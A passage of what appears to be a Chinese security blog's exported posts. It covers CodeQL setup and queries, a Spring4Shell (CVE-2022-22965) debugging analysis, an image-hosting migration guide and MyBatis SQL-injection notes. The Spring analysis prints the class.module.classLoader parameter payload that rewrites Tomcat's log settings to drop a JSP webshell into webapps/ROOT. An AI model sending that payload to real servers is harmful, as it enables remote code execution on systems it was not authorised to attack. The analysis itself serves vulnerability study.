&#x2F;Users&#x2F;zy&#x2F;Documents&#x2F;project&#x2F;codeql&#x2F;vscode-codeql-starter-main&#x2F;database&#x2F;codeql_java-sec-code &#x2F;Users&#x2F;zy&#x2F;Documents&#x2F;project&#x2F;codeql&#x2F;vscode-codeql-starter-main&#x2F;ql&#x2F;java&#x2F;ql&#x2F;src&#x2F;codeql-suites&#x2F;java-security-extended.qls --format&#x3D;csv --output&#x3D;java-results.csv</span><br></pre></td></tr></table></figure><h1 id="查询制定类的的方法"><a href="#查询制定类的的方法" class="headerlink" title="查询制定类的的方法"></a>查询制定类的的方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;Deserialize&quot;) </span><br><span class="line">and </span><br><span class="line">method.getDeclaringType().hasQualifiedName(&quot;org.joychou.controller&quot;, &quot;Fastjson&quot;)</span><br><span class="line"></span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/5912d1b5af755de7f142abf9b1cbe333.png" alt="image-20220309140530549"></p><h1 id="根据Method-name-和-interface-name-查询"><a href="#根据Method-name-和-interface-name-查询" class="headerlink" title="根据Method name 和 interface name 查询"></a>根据Method name 和 interface name 查询</h1><p>比如我想查询<code>ContentTypeHandler</code> 的所有子类<code>toObject</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;toObject&quot;) and method.getDeclaringType().getASupertype().hasQualifiedName(&quot;org.apache.struts2.rest.handler&quot;, &quot;ContentTypeHandler&quot;)</span><br><span class="line">select method</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 安全 codeql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Rce 漏洞分析CVE-2022-22965</title>
      <link href="/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/"/>
      <url>/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p>Spring Framework 是一个开源的轻量级J2EE应用程序开发框架。</p><p>3月31日，VMware发布安全公告，修复了Spring Framework中的远程代码执行漏洞（CVE-2022-22965）。在 JDK 9 及以上版本环境下，可以利用此漏洞在未授权的情况下在目标系统上写入恶意程序从而远程执行任意代码。</p><h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h1><p>影响组件：org.springframework:spring-beans</p><p>影响版本：&lt; 5.3.18 和 &lt; 5.2.20.RELEASE 的Spring框架均存在该漏洞</p><p>JDK版本：JDK&gt;=9</p><p>部署方式：war包部署在TOMCAT中</p><h1 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h1><p>​ 漏洞爆发之后，在学习大佬的分析之后发现，这个Spring最新0day漏洞其实不是全新的那种新洞，而是CVE-2010-1622这个漏洞的一种绕过情况。</p><p>​ 这个CVE-2010-1622漏洞的原因是Spring参数绑定时，可以注入一个Java pojo对象，这个对象可以是恶意的去注册一些敏感tomcat的属性，最后通过修改Tomcat的配置来执行危险操作。</p><p>​ 所以最新的CVE-2022-22965漏洞就是绕过了这个限制，可以说是Java 9的环境下坑了Spring一把，JDK9中存在可以绕过黑名单禁用的类，导致了这个漏洞，最后利用方式也就和之前一样了。</p><p>​ 下面部分细讲这个问题。</p><h1 id="0x04-Spring参数绑定"><a href="#0x04-Spring参数绑定" class="headerlink" title="0x04 Spring参数绑定"></a>0x04 Spring参数绑定</h1><p>首先就是先理一下Spring中的参数绑定</p><p>简单来说，springmvc中可以自动的去给参数赋值。</p><p>例如我们常见的穿参数的方式就是下面这种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;spring4shell_war&#x2F;?name&#x3D;zzz&amp;age&#x3D;123</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b7a05cb9296b8026317b9402db53a8d4.png" alt="image-20220407110257145"></p><h3 id="参数绑定的实现方式"><a href="#参数绑定的实现方式" class="headerlink" title="参数绑定的实现方式"></a>参数绑定的实现方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(Person person)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person person1 = <span class="keyword">new</span> Person();</span><br><span class="line">        person1.setName(person.getName());</span><br><span class="line">        person1.setAge(person.getAge());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方式就是直接传参数是一个Person对象，而不是以前的<code>@RequestParam</code>这种获取方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">HelloController</span><span class="params">( @RequestParam(required=<span class="keyword">false</span>)</span> String name, @<span class="title">RequestParam</span> <span class="params">( <span class="string">"age"</span> )</span> <span class="keyword">int</span> age) </span>&#123;</span><br></pre></td></tr></table></figure><p>这种参数绑定的实现方式方法就是如果用户传入name=zzz，则Spring框架会自动调用person.setName(‘zzz’)进行赋值。 如果提交的参数中出现了Person类的一个public字段或方法，就自动用户提交请求给他赋值。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/804ed9e2073f92c4a1b92b7c8ed120d9.png" alt="image-20220407111733457"></p><h1 id="0x05-调试过程"><a href="#0x05-调试过程" class="headerlink" title="0x05 调试过程"></a>0x05 调试过程</h1><p>1）用户请求经过tomcat处理后，调用Spring总入口DispatcherServlet.java的doDispath方法来路由处理http请求：</p><p>org.springframework.web.servlet.DispatcherServlet#doDispatch</p><p><img src="https://img-blog.csdnimg.cn/img_convert/19a5ecde2b1567c830206c2249dc4c57.png" alt="image-20220407153554154"></p><p>方法具体实现数据绑定</p><p>org.springframework.beans.AbstractPropertyAccessor#setPropertyValues(org.springframework.beans.PropertyValues, boolean, boolean)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4e0e91497d1e750207761fab28cc23dd.png" alt="image-20220407154547642"></p><p>nestedPa = getPropertyAccessorForPropertyPath(propertyName);那么看一下里面是什么</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6f7145e0dbe97c191b54eaa50c5a5576.png" alt="image-20220407155303997"></p><p>调用递归函数getPropertyAccessorForPropertyPath获取参数值，循环查看参数中是否包含”[“ “]‘’ ‘’.”</p><p>若存在则按分割赋值给nestedProperty,我这个是没有的所以返回-1了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4b2f05eae72bb14ae49acd506dfeccb6.png" alt="image-20220407163904995"></p><p>然后换一个payload会怎么样class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</p><p>这个时候pos就是5了，取出来第一个。后面class</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e072bbff093a4a617ceda8c33b6a5fe8.png" alt="image-20220407164504628"></p><p>BeanWrapperImpl#getCachedIntrospectionResults().getPropertyDescriptor(propertyName)</p><p>这里就是最开始我看到文章中分析的，会在缓存cache里去找我们输入的参数propertyName</p><p><img src="https://img-blog.csdnimg.cn/img_convert/eedf3c18f5a23bacbbdc9062221c0f38.png" alt="image-20220407165544156"></p><p>最终在org.springframework.beans.CachedIntrospectionResults#getPropertyDescriptor</p><p>这里就可以看到都可以获取到什么了。 <img src="https://img-blog.csdnimg.cn/img_convert/4cee82cb9910159aa88f8beec4980c85.png" alt="image-20220407165118281"></p><h2 id="补丁的绕过的问题"><a href="#补丁的绕过的问题" class="headerlink" title="补丁的绕过的问题"></a>补丁的绕过的问题</h2><p>红色是原来的补丁，绿色是现在的修复</p><p><img src="https://img-blog.csdnimg.cn/img_convert/daefa1aadaeea20ea9fe0a8eed213d0b.png" alt="image-20220407170706540"></p><p>所以原来是黑名单的判断逻辑，beanClass非Class或者属性name非(classLoader|protectionDomain)，</p><p>JDK8中没有只能用去class.classLoader调用</p><p>但是最新的CVE-2022-22965 用的class.module.classLoader，这样就就是绕过了这个限制。</p><p>原因是在Java 9以后，Class对象中多了一个Module类的属性，而Module类中也存在getClassLoader()方法，可以获取到一个class.module.classLoader</p><p>这次修补的理解就是：如果其中的属性是<code>ClassLoader</code> 和 <code>ProtectionDomain</code>，就直接continue跳过。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这个漏洞的本质利用Java 9中的模块里一些内部对象的属性注入</p><p>我们现在已知道的PAYLOAD就是更改Tomcat将一些全局配置</p><p>就是修改保存在classLoader.resources.context这个context中日志的格式与文件名</p><p>就是下面的这些</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D;xxx&amp; class.module.classLoader.resources.context.parent.pipeline.first.suffix&#x3D;.jsp&amp; class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT&amp; class.module.classLoader.resources.context.parent.pipeline.first.prefix&#x3D;tomcatwar&amp; class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;</span><br></pre></td></tr></table></figure><p>最后写在webapps/ROOT这个目录的一个webshell</p><h1 id="0x06-坑点"><a href="#0x06-坑点" class="headerlink" title="0x06 坑点"></a>0x06 坑点</h1><p>还有就是在调试的时候，如果是在idea里面调试部署tomcat，最终测试会找不到webshell。</p><p>这是因为idea是映射，并不在这个目录，所以你访问原版的tomcat里面并没有，其实是在idea的一个目录下。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/bcaf6e775bcbb5567f8f7b7d00ad0ecf.png" alt="image-20220407172208708"><br><img src="https://img-blog.csdnimg.cn/img_convert/a9bfb6cd0827010dc3afb9bdc97d7827.png" alt="image-20220407172416041"></p><p>还有就是每次写完shell会有缓存，如果发现没重复打payload没写成，就重启一下tomcat服务就好了。</p><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement" target="_blank" rel="noopener">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement</a></p><p><a href="http://rui0.cn/archives/1158" target="_blank" rel="noopener">SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析 - Ruilin (rui0.cn)</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 Spring 代码审计 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载：Gitee 图床 外链问题 处理</title>
      <link href="/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/"/>
      <url>/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="七牛图床准备"><a href="#七牛图床准备" class="headerlink" title="七牛图床准备"></a>七牛图床准备</h3><p>大半夜起来，发现Gitee图床加了外链，博客没法访问了。人都傻了。</p><p><a href="https://s2.loli.net/2022/03/26/uzlWJmk8etbQLsg.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/e8ddd7381fbd266493dec12e829d046b.png" alt="哭泣"></a></p><p><a href="https://s2.loli.net/2022/03/26/uzlWJmk8etbQLsg.png" target="_blank" rel="noopener">哭泣</a></p><p>博客上的图片都变成了无法加载的状态。</p><p><a href="https://s2.loli.net/2022/03/26/bYgQ7HJVXMmc5vh.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/821bfefbbf4b09f2f0468ef66342d40a.png" alt="心如死灰.jpg"></a></p><p><a href="https://s2.loli.net/2022/03/26/bYgQ7HJVXMmc5vh.png" target="_blank" rel="noopener">心如死灰.jpg</a></p><p>到各个图床平台试了一下，发现七牛云上传文件的时候是不会修改文件名的（SM.MS会），决定将仓库克隆下来，上传到七牛云再修改图片地址。</p><h3 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h3><p>找到图床仓库并打包下载即可。</p><p><a href="https://s2.loli.net/2022/03/26/IAuYQEHgDxObrd1.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/a2ec890c65c225fa19f2aa134cb5c40c.png" alt="克隆仓库"></a></p><p><a href="https://s2.loli.net/2022/03/26/IAuYQEHgDxObrd1.png" target="_blank" rel="noopener">克隆仓库</a></p><h3 id="七牛图床准备-1"><a href="#七牛图床准备-1" class="headerlink" title="七牛图床准备"></a>七牛图床准备</h3><p>注册七牛云平台略过，使用七牛云的对象存储功能。</p><p><a href="https://s2.loli.net/2022/03/26/yYMPi74zTQJXZLm.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/3dbe207da6a68aaf99f97c275bd3f622.png" alt="对象存储"></a></p><p><a href="https://s2.loli.net/2022/03/26/yYMPi74zTQJXZLm.png" target="_blank" rel="noopener">对象存储</a></p><p>在空间管理中新建一个空间，并选择公开。</p><p><a href="https://s2.loli.net/2022/03/26/VF7eR6MPHlWJcZ9.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/84a23924f11faeb8bf84b517703f8560.png" alt="新建空间"></a></p><p><a href="https://s2.loli.net/2022/03/26/VF7eR6MPHlWJcZ9.png" target="_blank" rel="noopener">新建空间</a></p><p>建好后刷新，并点开空间切换至文件管理，点击上传文件并选择克隆下来的仓库下的所有图片。</p><p><a href="https://s2.loli.net/2022/03/26/DpMeuW5IO6sj7dn.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/4e2c65d247baff4b59c0c4c3c9faf27c.png" alt="上传文件"></a></p><p><a href="https://s2.loli.net/2022/03/26/DpMeuW5IO6sj7dn.png" target="_blank" rel="noopener">上传文件</a></p><p><a href="https://s2.loli.net/2022/03/26/JdHfygsz9A5aZrv.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/aab2084691bcae90163e5ed9595c1e6d.png" alt="上传"></a></p><p><a href="https://s2.loli.net/2022/03/26/JdHfygsz9A5aZrv.png" target="_blank" rel="noopener">上传</a></p><p>点击开始上传后右侧任务中心可以打开并显示上传进度。</p><p><a href="https://s2.loli.net/2022/03/26/1SfI9zkQUvhOyGj.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/3812f42ae5ae4f51057e730aca93d30e.png" alt="上传进度"></a></p><p><a href="https://s2.loli.net/2022/03/26/1SfI9zkQUvhOyGj.png" target="_blank" rel="noopener">上传进度</a></p><p>上传完毕后刷新，点击文件详情可以查看文件地址。</p><p><a href="https://s2.loli.net/2022/03/26/s9wvhnpGucbk15e.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/1697259b57c48f284798391d96f977db.png" alt="文件信息"></a></p><p><a href="https://s2.loli.net/2022/03/26/s9wvhnpGucbk15e.png" target="_blank" rel="noopener">文件信息</a></p><h3 id="文件地址替换"><a href="#文件地址替换" class="headerlink" title="文件地址替换"></a>文件地址替换</h3><p>接下来就是紧张刺激的MarkDown链接替换操作了。</p><p>可以自己写代码读文件替换。我这里使用了Ide进行简单的文本替换。将原本gitee上的的前缀替换为七牛的CDN地址即可。</p><p><a href="https://s2.loli.net/2022/03/26/FA7Hqp6YT91nPoM.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/9e2ae53ae342f362a9ca09dc5a8bb468.png" alt="地址替换"></a></p><p><a href="https://s2.loli.net/2022/03/26/FA7Hqp6YT91nPoM.png" target="_blank" rel="noopener">地址替换</a></p><p>替换完毕后部署推送，一气呵成，目前一切恢复正常，终于可以安心休息了。</p><p><a href="https://s2.loli.net/2022/03/26/iYNMu2SUATdeIWs.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/img_convert/a67930d8c22f9fe74725220c4fdd2fdf.png" alt="恢复正常"></a></p><p>[恢复正常](</p><p>本文作者： maple<br>本文链接： <a href="http://www.ice-maple.com/2022/03/26/Gitee" target="_blank" rel="noopener">http://www.ice-maple.com/2022/03/26/Gitee</a> Pic Host Crash/<br>版权声明： 本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 gitee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeql 环境手模手搭建和简单使用</title>
      <link href="/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近这个东西实在太火了，而且log4j 和最近的<a href="https://blog.csdn.net/god_zzZ/article/details/123314194" target="_blank" rel="noopener">Spring Cloud Gateway</a> 都说是利用codeql来挖掘的，好不好用先用了再说。所以学习一下这个东西  　 </p><h2 id="0x01-CodeQL是什么"><a href="#0x01-CodeQL是什么" class="headerlink" title="0x01 CodeQL是什么"></a>0x01 CodeQL是什么</h2><p>　　<br>在我接触这个东西之前，我一直以为这是一个代码审计的工具，类似于Fortify rips 这种东西？<br>　<br>但其实并不是，理解大大错了。。。</p><p>还记得记得SQL的全称吗？ -&gt; Structured Query Language:结构化查询语言</p><p>所以我简单通俗的理解就是：</p><ul><li>Codeql = code + ql，这样就是一门面向对象的编程语言（对比SQL）</li><li>是把代码结构化分析后的存在一个代码数据库里面</li><li>然后就是写ql就可以进行各种查询</li><li>找某个方法、类、参数的传递等等。。。</li></ul><p>神奇。。</p><p>官方地址：</p><p><a href="https://github.com/github/codeql" target="_blank" rel="noopener">github/codeql: CodeQL: the libraries and queries that power security researchers around the world, as well as code scanning in GitHub Advanced Security (code scanning), LGTM.com, and LGTM Enterprise</a></p><p><a href="https://github.com/github/codeql" target="_blank" rel="noopener">https://github.com/github/codeql</a></p><h2 id="0x01-相关下载"><a href="#0x01-相关下载" class="headerlink" title="0x01 相关下载"></a>0x01 相关下载</h2><p>CodeQL本身包含两部分解析引擎+SDK</p><p>我推荐直接下载这个！可以直接配合 vscode 的现成项目，使用方便。</p><p><a href="https://github.com/github/vscode-codeql-starter" target="_blank" rel="noopener">https://github.com/github/vscode-codeql-starter</a></p><p>（注意下载的时候不能直接git clon，因为里面包含子项目</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6a3c5018d5d0d0db8e4f98dcdca28a2b.png" alt="image-20220304221924777"></p><h2 id="0x02-安装详细步骤"><a href="#0x02-安装详细步骤" class="headerlink" title="0x02 安装详细步骤"></a>0x02 安装详细步骤</h2><p>我这边推荐使用 vscode-codeql-starter 这个现成的项目，使用起来很方便</p><h3 id="1、vscode-环境"><a href="#1、vscode-环境" class="headerlink" title="1、vscode 环境"></a>1、vscode 环境</h3><ul><li>首先需要在官网下载并安装Visual Studio Code</li></ul><p><a href="https://code.visualstudio.com/" target="_blank" rel="noopener">Visual Studio Code - Code Editing. Redefined</a></p><ul><li>安装codeql插件：</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/1e197eb521572e3f8c5127107423f3a2.png" alt="image-20220304222734040"></p><h3 id="2-安装-CodeQL-引擎"><a href="#2-安装-CodeQL-引擎" class="headerlink" title="2 安装 CodeQL 引擎"></a>2 安装 CodeQL 引擎</h3><p>s引擎二进制文件下载 ：<a href="https://github.com/github/codeql-cli-binaries/releases" target="_blank" rel="noopener">Releases · github/codeql-cli-binaries</a></p><p>（推荐直接下载codeql.zip 这个是多平台都打包在一起）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a2cb467ec36e31755ce60c6ea7d6bbc8.png" alt="image-20220304221553522"></p><h3 id="3-克隆工作车间-Codeql-starter"><a href="#3-克隆工作车间-Codeql-starter" class="headerlink" title="3 克隆工作车间 Codeql starter"></a>3 克隆工作车间 Codeql starter</h3><p>我推荐直接下载这个！可以直接配合 vscode 的现成项目，使用方便。</p><p><a href="https://github.com/github/vscode-codeql-starter" target="_blank" rel="noopener">https://github.com/github/vscode-codeql-starter</a></p><p>（注意下载的时候不能直接git clone，因为里面包含子项目</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6a3c5018d5d0d0db8e4f98dcdca28a2b.png" alt="image-20220304221924777"></p><p>这个项目里的 submodule 也须要 Clone</p><p>使用下面命令一步到位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/github/vscode-codeql-starter/</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6592caf3f2edce99827af28ea26d87c7.png" alt="image-20220304224556711"><br>(如果子模块clone失败，可以自己下载放进去也行)</p><h3 id="4-配置环境变量"><a href="#4-配置环境变量" class="headerlink" title="4 配置环境变量"></a>4 配置环境变量</h3><p>1 、在 VSCode 菜单中点击 <code>File &gt; Open Workspace</code> 选择 <code>vscode-codeql-starter.code-workspace</code> 这个文件来打开这个工作区。</p><p>2、找到插件的扩展设置</p><p><img src="https://img-blog.csdnimg.cn/img_convert/426fefbba4e3f578100b4c814db923e3.png" alt="image-20220304225202804"></p><p>3、设置引擎地址</p><p>这里面添加引擎刚刚下载的 CodeQL 引擎的可执行文件</p><p><img src="https://img-blog.csdnimg.cn/img_convert/80218c8e03b9e69baef9e37553bf9faf.png" alt="image-20220304225259649"></p><p>就是codeql.zip 解压后对于系统的可执行文件地址<img src="https://img-blog.csdnimg.cn/img_convert/1b663484abb11ad4a00eaf9e60d6cf86.png" alt="image-20220304225430633"></p><h3 id="5-系统环境变量添加"><a href="#5-系统环境变量添加" class="headerlink" title="5 系统环境变量添加"></a>5 系统环境变量添加</h3><p>为了方便后面使用codeql，还需要把刚刚那个添加到系统里面</p><p>我是Mac 就是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.zshrc</span><br><span class="line">alias codeql&#x3D;&quot;&#x2F;Users&#x2F;zy&#x2F;Documents&#x2F;project&#x2F;codeql&#x2F;CodeQLCLI&#x2F;codeql&quot;</span><br></pre></td></tr></table></figure><p>windows 就和添加Java环境变量一样，设置一个path到刚刚到codeql.exe 那个目录就行了</p><p>到这里环境应该就是好了，下一步就是建立数据库了（或导入数据库）</p><h2 id="0x03-创建数据库（Java）"><a href="#0x03-创建数据库（Java）" class="headerlink" title="0x03 创建数据库（Java）"></a>0x03 创建数据库（Java）</h2><ul><li>打开终端使用 codeql命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create [数据库存的路径]  --language&#x3D;&quot;java&quot;  --command&#x3D;&quot;mvn clean install --file pom.xml&quot; --source-root&#x3D;[源码路径路径]</span><br></pre></td></tr></table></figure><p>例如我的用的这个项目作为审计的目标 <a href="https://github.com/godzeo/java-sec-code" target="_blank" rel="noopener">https://github.com/godzeo/java-sec-code</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /Users/zy/Documents/project/codeql/vscode-codeql-starter-main/database/codeql_java-sec-code  --language="java"  --command="mvn clean install --file pom.xml" --source-root=/Users/zy/Documents/project/sec_java_vul/java-sec-code</span><br></pre></td></tr></table></figure><p>然后把这个命令拆解看一下</p><table><thead><tr><th>codeql database create java-database</th><th>创建数据库，名字为codeql_java-sec-code</th></tr></thead><tbody><tr><td>-language=java</td><td>编译语言为java</td></tr><tr><td>-command=“mvn clean install –file pom.xml”</td><td>利用命令进行源码编译</td></tr><tr><td>–source-root</td><td>设置源码的路径</td></tr></tbody></table><p>成功建库</p><p><img src="https://img-blog.csdnimg.cn/img_convert/87b24445faaf162524b17454cefb235f.png" alt="image-20220305164718115"></p><h2 id="0x04-导入库进行查询"><a href="#0x04-导入库进行查询" class="headerlink" title="0x04 导入库进行查询"></a>0x04 导入库进行查询</h2><p>在vscode里面找到 导入数据库</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0c7a8368eba51c627e4118781cda3bab.png" alt="image-20220305164846289"></p><p>这样就是导入成功了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/738e5fe7a38bfc958543ddbe64af0c88.png" alt="image-20220305164933079"></p><p>下面开始查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">跟目录&#x2F;ql&#x2F;java&#x2F;ql&#x2F;src&#x2F;Security                 放着一些官方的规则(java)，可直接用。</span><br><span class="line">这跟目录&#x2F;ql&#x2F;java&#x2F;ql&#x2F;src&#x2F;experimental&#x2F;Security  一些还在实验中的规则(java)。</span><br></pre></td></tr></table></figure><p>找到规则文件试一下，xss.ql 文件 ，右键 Run Query</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6d797139186e93960c732702e8e527e0.png" alt="image-20220305165221286"></p><p>出结果了，跑通了这就是</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b4ac3fe75d4adfda68b9c3ebe8614e7a.png" alt="image-20220305165413207"></p><p>然后点一下就找到了漏洞点了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/23796c41f92e639d123a40bdbfbeaa4f.png" alt="image-20220305165516750"></p><p>基础的完成之后，这就能勉勉强强用了，然后就是学习语法规则，自己写规则使用了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode web安全 代码审计 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java预编译一些场景下的局限.md</title>
      <link href="/2022/03/12/Java%E9%A2%84%E7%BC%96%E8%AF%91%E4%B8%80%E4%BA%9B%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%B1%80%E9%99%90.md/"/>
      <url>/2022/03/12/Java%E9%A2%84%E7%BC%96%E8%AF%91%E4%B8%80%E4%BA%9B%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%B1%80%E9%99%90.md/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="0x00-Mybatis框架"><a href="#0x00-Mybatis框架" class="headerlink" title="0x00 Mybatis框架"></a>0x00 Mybatis框架</h2><h2 id="的-的区别"><a href="#的-的区别" class="headerlink" title="#的$的区别"></a><code>#</code>的<code>$</code>的区别</h2><ul><li><code>#</code>号会点语句进行预编译</li><li><code>${ }</code> 只是进行string 替换，动态解析SQL的时候会进行变量替换</li></ul><h2 id="0x01-预编译一些场景下的局限"><a href="#0x01-预编译一些场景下的局限" class="headerlink" title="0x01 预编译一些场景下的局限"></a>0x01 预编译一些场景下的局限</h2><ul><li>表名作为变量时，需使用拼接</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;user&#96;   </span><br><span class="line">select * from &#39;user&#39; #报错，表名不能使用单引号</span><br></pre></td></tr></table></figure><ul><li>order by后需要使用拼接</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user order by name</span><br><span class="line">select * from user order by &#39;name&#39; # 语义发生改变，没有排序的效果了</span><br></pre></td></tr></table></figure><h2 